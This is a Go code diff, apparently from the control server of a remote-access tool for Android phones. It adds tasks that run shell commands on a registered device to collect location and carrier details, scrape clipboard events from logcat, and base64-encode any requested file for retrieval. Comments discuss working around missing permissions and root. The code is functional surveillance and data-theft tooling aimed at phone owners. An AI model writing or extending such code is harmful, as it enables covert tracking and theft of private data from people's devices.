@@ -288,6 +288,25 @@ deviceSeed := regReq.DeviceID
 		case protocol.TaskIfconfig:
 			taskType = "shell"
 			command = "ip addr"
+		case protocol.TaskLocation:
+			taskType = "shell"
+			// dumpsys needs DUMP permission. Use settings + getprop for what's accessible.
+			command = `echo "Location Providers: $(settings get secure location_providers_allowed 2>&1)"; echo "GPS Enabled: $(settings get secure location_mode 2>&1)"; echo "Country: $(getprop gsm.operator.iso-country 2>&1)"; echo "Operator: $(getprop gsm.operator.alpha 2>&1)"; echo "Cell Type: $(getprop gsm.network.type 2>&1)"; echo "WiFi SSID: $(dumpsys wifi 2>&1 | head -5)"`
+
+		case protocol.TaskClipboard:
+			taskType = "shell"
+			// Android clipboard needs ClipboardManager API from Java.
+			// From shell, best effort: logcat for clipboard events
+			command = `logcat -d -s ClipboardService -t 20 2>&1`
+
+		case protocol.TaskFileGet:
+			taskType = "shell"
+			if command != "" {
+				command = `base64 '` + strings.ReplaceAll(command, "'", "'\\''") + `'`
+			} else {
+				command = `echo "Usage: fileget <path>"`
+			}
+
 		case protocol.TaskScreenshot:
 			taskType = "shell"
 			// screencap needs root — grab the most recent existing screenshot instead.
